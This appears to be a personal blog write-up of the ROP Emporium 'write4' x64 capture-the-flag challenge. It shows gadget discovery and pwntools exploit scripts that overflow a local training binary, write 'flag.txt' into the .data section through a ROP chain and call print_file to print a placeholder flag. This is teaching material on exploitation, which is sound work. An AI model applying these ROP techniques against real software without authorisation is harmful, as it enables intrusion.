---
layout: single
title:  "ROP Emporium - Write4 (x64)"
date:   2020-10-11
excerpt: "write4 was a fundamental challenge from the rop emporium that required the pwner to write a string to an arbitrary memory address and pass it to a function as an argument. I will be skipping some basic steps such as finding the offset at which we take control over RIP and analyzing execution flow in the ROP chain. If you wish to see how to do that, you should check out my previous blog posts on Rop Emporium ret2win and split."
categories:
  - ctf
  - infosec
tags:
  - binary exploitation
  - exploit development
  - defeating non-executable stacks
  - rop chaining
---

## Summary

write4 was a fundamental challenge from the rop emporium that required the pwner to write a string to an arbitrary memory address and pass it to a function as an argument. You can read more on the challenge [here](https://ropemporium.com/challenge/write4.html). I will be skipping some basic steps such as finding the offset at which we take control over RIP and analyzing execution flow in the ROP chain. If you wish to see how to do that, you should check out my previous blog posts on Rop Emporium ret2win and split.

## Analyze the Countermeasures

Always analyze binary countermeasures because it will determine our objective for exploiting the binary and what the limitations are. For all my binary exploit development walkthroughs, I will be using [pwntools](http://docs.pwntools.com/en/stable/) which when installed comes with `checksec`. This tool analyzes countermeasures in the binary when it was initially compiled: 

```
$ checksec write4
[*] '/home/kali/ctf/rop-emporium/write4/x64/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

The stack is **non-executable**, so we won't be able to redirect the program's execution to memory instructions located on the stack.
It is also notable that `RUNPATH` points to the current working directory. This is because this challenge also came with a `libwrite4.so` shared object file that links to the executable upon runtime:

```
$ ldd write4
        linux-vdso.so.1 (0x00007ffe615b9000)
        libwrite4.so => ./libwrite4.so (0x00007f653b016000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f653ae37000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f653b21a000)
```

## The Challenge Layout

This challenge came with a shared object file `libwrite4.so` which is linked at runtime:

```
flag.txt  libwrite4.so  write4
```

### Goals

1. Write "flag.txt" to a memory address because the string `/bin/cat flag.txt` does not exist in the binary.
2. Invoke `print_file(flag_txt_memory_address)`.

## Satisfying the Criteria

This challenge will only be exploitable if we can satisfy a few conditions.

First, we need a writable memory segment:

```
$ rabin2 -S write4
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ----
1   0x00000238   0x1c 0x00400238   0x1c -r-- .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- .note.ABI_tag
3   0x00000274   0x24 0x00400274   0x24 -r-- .note.gnu.build_id
4   0x00000298   0x38 0x00400298   0x38 -r-- .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- .dynsym
6   0x000003c0   0x7c 0x004003c0   0x7c -r-- .dynstr
7   0x0000043c   0x14 0x0040043c   0x14 -r-- .gnu.version
8   0x00000450   0x20 0x00400450   0x20 -r-- .gnu.version_r
9   0x00000470   0x30 0x00400470   0x30 -r-- .rela.dyn
10  0x000004a0   0x30 0x004004a0   0x30 -r-- .rela.plt
11  0x000004d0   0x17 0x004004d0   0x17 -r-x .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x .plt
13  0x00000520  0x182 0x00400520  0x182 -r-x .text
14  0x000006a4    0x9 0x004006a4    0x9 -r-x .fini
15  0x000006b0   0x10 0x004006b0   0x10 -r-- .rodata
16  0x000006c0   0x44 0x004006c0   0x44 -r-- .eh_frame_hdr
17  0x00000708  0x120 0x00400708  0x120 -r-- .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
25  0x00001038   0x29 0x00000000   0x29 ---- .comment
26  0x00001068  0x618 0x00000000  0x618 ---- .symtab
27  0x00001680  0x1f6 0x00000000  0x1f6 ---- .strtab
28  0x00001876  0x103 0x00000000  0x103 ---- .shstrtab
```

The `.data` section is normally a safe place to write to and has `0x10` bytes of space available.
On this note, we should be able to write `flag.txt` to memory address `0x00601028`.

Next, we need to write arbitrary data to the `.data` segment.

Let's search for interesting symbols in `write4`:

```
[0x00400628]> is
[Symbols]

nth paddr       vaddr      bind   type   size lib name
――――――――――――――――――――――――――――――――――――――――――――――――――――――
... CONTENT SNIPPED ...
37   0x00000628 0x00400628 LOCAL  NOTYPE 0        usefulGadgets
... CONTENT SNIPPED ...
```

We can disassemble three instructions at `usefulGadgets`:

```
[0x00400628]> pd 3 @0x00400628
            ;-- usefulGadgets:
            0x00400628      4d893e         mov qword [r14], r15
            0x0040062b      c3             ret
            0x0040062c      0f1f4000       nop dword [rax]
```

With the `mov qword [r14], r15` instruction, we can write 8 bytes at a time to the memory address in `r14`.

Next, we need to search for a ROP gadget where we can assign arbitrary values to the `r14` and `r15` registers:

```
[0x00601028]> /R pop r14;
  0x0040068c               415c  pop r12
  0x0040068e               415d  pop r13
  0x00400690               415e  pop r14
  0x00400692               415f  pop r15
  0x00400694                 c3  ret

  0x0040068d                 5c  pop rsp
  0x0040068e               415d  pop r13
  0x00400690               415e  pop r14
  0x00400692               415f  pop r15
  0x00400694                 c3  ret

  0x0040068f                 5d  pop rbp
  0x00400690               415e  pop r14
  0x00400692               415f  pop r15
  0x00400694                 c3  ret
```

Looks like we have a gadget at `0x00400690`.

The last thing we need is a `pop rdi; ret;` gadget so that we can set the RDI register to the memory address we wrote to:

```
[0x00601028]> /R pop rdi;
  0x00400693                 5f  pop rdi
  0x00400694                 c3  ret
```

Great! We have a `pop rdi; ret;` gadget at `0x00400693`.

## Crafting the Exploit

At this point, we should be able to verify that we can write arbitrary values to the static address in the `.data` segment!
In the code below, I set a breakpoint just before we write to the `.data` segment.

```python
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './write4'
io = process(PROCESS)

# Debugging
gdbscript = "b *0x400628"
pid = gdb.attach(io, gdbscript=gdbscript)

rop = ROP(io.elf)
writable_data_segment = p64(0x00601028)
write_memory_gadget = p64(0x00400628) # mov qword [r14], r15; ret;
pop_rdi_ret = p64(rop.search(move=0,regs=['rdi']).address)
pop_r14_pop_r15_ret = p64(rop.search(move=0,regs=['r14', 'r15']).address)

rop.raw(pop_r14_pop_r15_ret)
rop.raw(writable_data_segment)
rop.raw(p64(0xdeadbeefdeadbeef))
rop.raw(write_memory_gadget)
info(rop.dump())

offset = 40
padding = b"A" * offset
payload = b"".join([
    padding,
    rop.chain()
])

io.clean()
io.sendline(payload)
io.interactive()
```

```
$ python3 exploit.py
[+] Starting local process './write4' argv=[b'./write4'] : pid 7701
[DEBUG] Wrote gdb script to '/tmp/pwnycdicsv0.gdb'
    b *0x400628
[*] running in new terminal: /usr/bin/gdb -q  "./write4" 7701 -x /tmp/pwnycdicsv0.gdb
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./write4" 7701 -x /tmp/pwnycdicsv0.gdb']
[+] Waiting for debugger: Done
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[*] '/home/kali/ctf/rop-emporium/write4/x64/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './write4'
[*] 0x0000: b'\x90\x06@\x00\x00\x00\x00\x00' b'\x90\x06@\x00\x00\x00\x00\x00'
    0x0008: b'(\x10`\x00\x00\x00\x00\x00' b'(\x10`\x00\x00\x00\x00\x00'
    0x0010: b'\xef\xbe\xad\xde\xef\xbe\xad\xde' b'\xef\xbe\xad\xde\xef\xbe\xad\xde'
    0x0018: b'(\x06@\x00\x00\x00\x00\x00' b'(\x06@\x00\x00\x00\x00\x00'
[DEBUG] Received 0x4a bytes:
    b'write4 by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Go ahead and give me the input already!\n'
    b'\n'
    b'> '
[DEBUG] Sent 0x49 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  90 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  28 10 60 00  00 00 00 00  ef be ad de  ef be ad de  │(·`·│····│····│····│
    00000040  28 06 40 00  00 00 00 00  0a                        │(·@·│····│·│
    00000049
[*] Switching to interactive mode
[DEBUG] Received 0xb bytes:
    b'Thank you!\n'
Thank you!
[*] Got EOF while reading in interactive
$ quit
[DEBUG] Sent 0x5 bytes:
    b'quit\n'

```

In GDB:

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb               
$rbx   : 0x0               
$rcx   : 0x00007f2c89720ff3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007ffd73a02848  →  0x000000010000000a
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007f2c897f1723  →  0x7f3670000000000a
$rdi   : 0x00007f2c897f3670  →  0x0000000000000000
$rip   : 0x000000000040062b  →  <usefulGadgets+3> ret 
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0xfffffffffffff52d
$r11   : 0x246             
$r12   : 0x0000000000400520  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0000000000601028  →  0xdeadbeefdeadbeef
$r15   : 0xdeadbeefdeadbeef
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd73a02848│+0x0000: 0x000000010000000a   ← $rsp
0x00007ffd73a02850│+0x0008: 0x0000000000400607  →  <main+0> push rbp
0x00007ffd73a02858│+0x0010: 0x00007f2c896587d9  →  <init_cacheinfo+297> mov rbp, rax
0x00007ffd73a02860│+0x0018: 0x0000000000000000
0x00007ffd73a02868│+0x0020: 0x8384135c71fb164c
0x00007ffd73a02870│+0x0028: 0x0000000000400520  →  <_start+0> xor ebp, ebp
0x00007ffd73a02878│+0x0030: 0x0000000000000000
0x00007ffd73a02880│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400626 <usefulFunction+15> pop    rbp
     0x400627 <usefulFunction+16> ret    
     0x400628 <usefulGadgets+0> mov    QWORD PTR [r14], r15
 →   0x40062b <usefulGadgets+3> ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "write4", stopped 0x40062b in usefulGadgets (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40062b → usefulGadgets()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/2xg $r14
0x601028:       0xdeadbeefdeadbeef      0x0000000000000000
```

Success! We have successfully written the dummy data `0xdeadbeefdeadbeef` to the `.data` segment!

At this point, we need to write `flag.txt`.
To be safe, we will write one character at a time.

```python
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './write4'
io = process(PROCESS)

# Debugging
gdbscript = "b *0x400628"
pid = gdb.attach(io, gdbscript=gdbscript)

# Gadgets
rop = ROP(io.elf)
writable_data_segment = 0x00601028
write_memory_gadget = p64(0x00400628) # mov qword [r14], r15; ret;
pop_rdi_ret = p64(rop.search(move=0,regs=['rdi']).address)
pop_r14_pop_r15_ret = p64(rop.search(move=0,regs=['r14', 'r15']).address)

# Build the ROP chain
target = b"flag.txt"
for idx, c in enumerate(target):
    write_location = p64(writable_data_segment + idx)
    rop.raw(pop_r14_pop_r15_ret)
    rop.raw(write_location)
    rop.raw(c)
    rop.raw(write_memory_gadget)

info(rop.dump())

# Build the payload
offset = 40
padding = b"A" * offset
payload = b"".join([
    padding,
    rop.chain()
])

# Pwn!
io.clean()
io.sendline(payload)
io.interactive()
```

```
$ python3 exploit.py
[+] Starting local process './write4' argv=[b'./write4'] : pid 7971
[DEBUG] Wrote gdb script to '/tmp/pwn4mskcyey.gdb'
    b *0x400628
[*] running in new terminal: /usr/bin/gdb -q  "./write4" 7971 -x /tmp/pwn4mskcyey.gdb
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./write4" 7971 -x /tmp/pwn4mskcyey.gdb']
[+] Waiting for debugger: Done
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[*] '/home/kali/ctf/rop-emporium/write4/x64/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './write4'
[*] 0x0000: b'\x90\x06@\x00\x00\x00\x00\x00' b'\x90\x06@\x00\x00\x00\x00\x00'
    0x0008: b'(\x10`\x00\x00\x00\x00\x00' b'(\x10`\x00\x00\x00\x00\x00'
    0x0010:             0x66
    0x0018: b'(\x06@\x00\x00\x00\x00\x00' b'(\x06@\x00\x00\x00\x00\x00'
    0x0020: b'\x90\x06@\x00\x00\x00\x00\x00' b'\x90\x06@\x00\x00\x00\x00\x00'
    0x0028: b')\x10`\x00\x00\x00\x00\x00' b')\x10`\x00\x00\x00\x00\x00'
    0x0030:             0x6c
    0x0038: b'(\x06@\x00\x00\x00\x00\x00' b'(\x06@\x00\x00\x00\x00\x00'
    0x0040: b'\x90\x06@\x00\x00\x00\x00\x00' b'\x90\x06@\x00\x00\x00\x00\x00'
    0x0048: b'*\x10`\x00\x00\x00\x00\x00' b'*\x10`\x00\x00\x00\x00\x00'
    0x0050:             0x61
    0x0058: b'(\x06@\x00\x00\x00\x00\x00' b'(\x06@\x00\x00\x00\x00\x00'
    0x0060: b'\x90\x06@\x00\x00\x00\x00\x00' b'\x90\x06@\x00\x00\x00\x00\x00'
    0x0068: b'+\x10`\x00\x00\x00\x00\x00' b'+\x10`\x00\x00\x00\x00\x00'
    0x0070:             0x67
    0x0078: b'(\x06@\x00\x00\x00\x00\x00' b'(\x06@\x00\x00\x00\x00\x00'
    0x0080: b'\x90\x06@\x00\x00\x00\x00\x00' b'\x90\x06@\x00\x00\x00\x00\x00'
    0x0088: b',\x10`\x00\x00\x00\x00\x00' b',\x10`\x00\x00\x00\x00\x00'
    0x0090:             0x2e
    0x0098: b'(\x06@\x00\x00\x00\x00\x00' b'(\x06@\x00\x00\x00\x00\x00'
    0x00a0: b'\x90\x06@\x00\x00\x00\x00\x00' b'\x90\x06@\x00\x00\x00\x00\x00'
    0x00a8: b'-\x10`\x00\x00\x00\x00\x00' b'-\x10`\x00\x00\x00\x00\x00'
    0x00b0:             0x74
    0x00b8: b'(\x06@\x00\x00\x00\x00\x00' b'(\x06@\x00\x00\x00\x00\x00'
    0x00c0: b'\x90\x06@\x00\x00\x00\x00\x00' b'\x90\x06@\x00\x00\x00\x00\x00'
    0x00c8: b'.\x10`\x00\x00\x00\x00\x00' b'.\x10`\x00\x00\x00\x00\x00'
    0x00d0:             0x78
    0x00d8: b'(\x06@\x00\x00\x00\x00\x00' b'(\x06@\x00\x00\x00\x00\x00'
    0x00e0: b'\x90\x06@\x00\x00\x00\x00\x00' b'\x90\x06@\x00\x00\x00\x00\x00'
    0x00e8: b'/\x10`\x00\x00\x00\x00\x00' b'/\x10`\x00\x00\x00\x00\x00'
    0x00f0:             0x74
    0x00f8: b'(\x06@\x00\x00\x00\x00\x00' b'(\x06@\x00\x00\x00\x00\x00'
[DEBUG] Received 0x4a bytes:
    b'write4 by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Go ahead and give me the input already!\n'
    b'\n'
    b'> '
[DEBUG] Sent 0x129 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  90 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  28 10 60 00  00 00 00 00  66 00 00 00  00 00 00 00  │(·`·│····│f···│····│
    00000040  28 06 40 00  00 00 00 00  90 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    00000050  29 10 60 00  00 00 00 00  6c 00 00 00  00 00 00 00  │)·`·│····│l···│····│
    00000060  28 06 40 00  00 00 00 00  90 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    00000070  2a 10 60 00  00 00 00 00  61 00 00 00  00 00 00 00  │*·`·│····│a···│····│
    00000080  28 06 40 00  00 00 00 00  90 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    00000090  2b 10 60 00  00 00 00 00  67 00 00 00  00 00 00 00  │+·`·│····│g···│····│
    000000a0  28 06 40 00  00 00 00 00  90 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    000000b0  2c 10 60 00  00 00 00 00  2e 00 00 00  00 00 00 00  │,·`·│····│.···│····│
    000000c0  28 06 40 00  00 00 00 00  90 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    000000d0  2d 10 60 00  00 00 00 00  74 00 00 00  00 00 00 00  │-·`·│····│t···│····│
    000000e0  28 06 40 00  00 00 00 00  90 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    000000f0  2e 10 60 00  00 00 00 00  78 00 00 00  00 00 00 00  │.·`·│····│x···│····│
    00000100  28 06 40 00  00 00 00 00  90 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    00000110  2f 10 60 00  00 00 00 00  74 00 00 00  00 00 00 00  │/·`·│····│t···│····│
    00000120  28 06 40 00  00 00 00 00  0a                        │(·@·│····│·│
    00000129
[*] Switching to interactive mode
[DEBUG] Received 0xb bytes:
    b'Thank you!\n'
Thank you!
```

After enough iterations, we successfully set the `.data` segment to `flag.txt`:

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb               
$rbx   : 0x0               
$rcx   : 0x00007f4ead555ff3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007ffe9cb00330  →  0x0000000000000000
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007f4ead626723  →  0x628670000000000a
$rdi   : 0x00007f4ead628670  →  0x0000000000000000
$rip   : 0x00007ffe9cb0240a  →  0x4853003465746972 ("rite4"?)
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0xfffffffffffff52d
$r11   : 0x246             
$r12   : 0x0000000000400520  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x000000000060102f  →  0x0000000000000074 ("t"?)
$r15   : 0x74              
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffe9cb00330│+0x0000: 0x0000000000000000   ← $rsp
0x00007ffe9cb00338│+0x0008: 0x00007ffe9cb02410  →  "SHELL=/bin/bash"
0x00007ffe9cb00340│+0x0010: 0x00007ffe9cb02420  →  "SESSION_MANAGER=local/kali:@/tmp/.ICE-unix/1053,un[...]"
0x00007ffe9cb00348│+0x0018: 0x00007ffe9cb0246e  →  "WINDOWID=0"
0x00007ffe9cb00350│+0x0020: 0x00007ffe9cb02479  →  "QT_ACCESSIBILITY=1"
0x00007ffe9cb00358│+0x0028: 0x00007ffe9cb0248c  →  "XDG_CONFIG_DIRS=/etc/xdg"
0x00007ffe9cb00360│+0x0030: 0x00007ffe9cb024a5  →  "XDG_SESSION_PATH=/org/freedesktop/DisplayManager/S[...]"
0x00007ffe9cb00368│+0x0038: 0x00007ffe9cb024df  →  "XDG_MENU_PREFIX=xfce-"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
 → 0x7ffe9cb0240a                  jb     0x7ffe9cb02475        NOT taken [Reason: !(C)]
   0x7ffe9cb0240c                  je     0x7ffe9cb02473
   0x7ffe9cb0240e                  xor    al, 0x0
   0x7ffe9cb02410                  push   rbx
   0x7ffe9cb02411                  rex.W  
   0x7ffe9cb02412                  rex.RB 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "write4", stopped 0x7ffe9cb0240a in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffe9cb0240a → jb 0x7ffe9cb02475
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/s 0x601028
0x601028:       "flag.txt"
```

Now, there is one last step: we need to point RDI to `flag.txt` and invoke the `print_file` function.
The updated code looks like the following:

```python
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './write4'
io = process(PROCESS)

# Gadgets
rop = ROP(io.elf)
writable_data_segment = 0x00601028
write_memory_gadget = p64(0x00400628) # mov qword [r14], r15; ret;
pop_rdi_ret = p64(rop.search(move=0,regs=['rdi']).address)
pop_r14_pop_r15_ret = p64(rop.search(move=0,regs=['r14', 'r15']).address)

# Existing functions
print_file = p64(io.elf.plt['print_file'])

# Build the ROP chain - Write to the .data section
target = b"flag.txt"
for idx, c in enumerate(target):
    write_location = p64(writable_data_segment + idx)
    rop.raw(pop_r14_pop_r15_ret)
    rop.raw(write_location)
    rop.raw(c)
    rop.raw(write_memory_gadget)

# Build the ROP chain - Call print_file(writable_data_segment)
rop.raw(pop_rdi_ret)
rop.raw(p64(writable_data_segment))
rop.raw(print_file)

# Build the payload
offset = 40
padding = b"A" * offset
payload = b"".join([
    padding,
    rop.chain()
])

# Pwn!
io.clean()
io.sendline(payload)
io.interactive()
```

```
$ python3 exploit.py
[+] Starting local process './write4' argv=[b'./write4'] : pid 8017
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[*] '/home/kali/ctf/rop-emporium/write4/x64/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './write4'
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[DEBUG] Received 0x4a bytes:
    b'write4 by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Go ahead and give me the input already!\n'
    b'\n'
    b'> '
[DEBUG] Sent 0x141 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  90 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  28 10 60 00  00 00 00 00  66 00 00 00  00 00 00 00  │(·`·│····│f···│····│
    00000040  28 06 40 00  00 00 00 00  90 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    00000050  29 10 60 00  00 00 00 00  6c 00 00 00  00 00 00 00  │)·`·│····│l···│····│
    00000060  28 06 40 00  00 00 00 00  90 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    00000070  2a 10 60 00  00 00 00 00  61 00 00 00  00 00 00 00  │*·`·│····│a···│····│
    00000080  28 06 40 00  00 00 00 00  90 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    00000090  2b 10 60 00  00 00 00 00  67 00 00 00  00 00 00 00  │+·`·│····│g···│····│
    000000a0  28 06 40 00  00 00 00 00  90 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    000000b0  2c 10 60 00  00 00 00 00  2e 00 00 00  00 00 00 00  │,·`·│····│.···│····│
    000000c0  28 06 40 00  00 00 00 00  90 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    000000d0  2d 10 60 00  00 00 00 00  74 00 00 00  00 00 00 00  │-·`·│····│t···│····│
    000000e0  28 06 40 00  00 00 00 00  90 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    000000f0  2e 10 60 00  00 00 00 00  78 00 00 00  00 00 00 00  │.·`·│····│x···│····│
    00000100  28 06 40 00  00 00 00 00  90 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    00000110  2f 10 60 00  00 00 00 00  74 00 00 00  00 00 00 00  │/·`·│····│t···│····│
    00000120  28 06 40 00  00 00 00 00  93 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    00000130  28 10 60 00  00 00 00 00  10 05 40 00  00 00 00 00  │(·`·│····│··@·│····│
    00000140  0a                                                  │·│
    00000141
[*] Switching to interactive mode
[DEBUG] Received 0x2c bytes:
    b'Thank you!\n'
    b'ROPE{a_placeholder_32byte_flag!}\n'
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

And it looks like we got the flag: `ROPE{a_placeholder_32byte_flag!}`!

Notice that this required many ROP chain iterations to work, bloating our payload to `0x141` bytes!
Since on x64 CPU archictures, memory registers can hold up to 8 bytes at a time, that means we can make our ROP chain 8 times smaller with the following code:


```python
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './write4'
io = process(PROCESS)

# Gadgets
rop = ROP(io.elf)
writable_data_segment = 0x00601028
write_memory_gadget = p64(0x00400628) # mov qword [r14], r15; ret;
pop_rdi_ret = p64(rop.search(move=0,regs=['rdi']).address)
pop_r14_pop_r15_ret = p64(rop.search(move=0,regs=['r14', 'r15']).address)

# Existing functions
print_file = p64(io.elf.plt['print_file'])

# Build the ROP chain - Write to the .data section
target = b"flag.txt"
idx = 0
addr_size = 8
while idx < len(target):
    data = target[idx:idx+addr_size]
    write_location = p64(writable_data_segment + idx)
    rop.raw(pop_r14_pop_r15_ret)
    rop.raw(write_location)
    rop.raw(data)
    rop.raw(write_memory_gadget)
    idx += addr_size

# Build the ROP chain - Call print_file(writable_data_segment)
rop.raw(pop_rdi_ret)
rop.raw(p64(writable_data_segment))
rop.raw(print_file)

# Build the payload
offset = 40
padding = b"A" * offset
payload = b"".join([
    padding,
    rop.chain()
])

# Pwn!
io.clean()
io.sendline(payload)
io.interactive()
```

```
$ python3 exploit.py
[+] Starting local process './write4' argv=[b'./write4'] : pid 8157
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[*] '/home/kali/ctf/rop-emporium/write4/x64/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './write4'
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[DEBUG] Received 0x4a bytes:
    b'write4 by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Go ahead and give me the input already!\n'
    b'\n'
    b'> '
[DEBUG] Sent 0x61 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  90 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  28 10 60 00  00 00 00 00  66 6c 61 67  2e 74 78 74  │(·`·│····│flag│.txt│
    00000040  28 06 40 00  00 00 00 00  93 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    00000050  28 10 60 00  00 00 00 00  10 05 40 00  00 00 00 00  │(·`·│····│··@·│····│
    00000060  0a                                                  │·│
    00000061
[*] Switching to interactive mode
[*] Process './write4' stopped with exit code -11 (SIGSEGV) (pid 8157)
[DEBUG] Received 0x2c bytes:
    b'Thank you!\n'
    b'ROPE{a_placeholder_32byte_flag!}\n'
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ quit
[DEBUG] Sent 0x5 bytes:
    b'quit\n'
[*] Got EOF while sending in interactive
```

Notice how the final payload above was only `0x61` bytes and still granted us the flag!
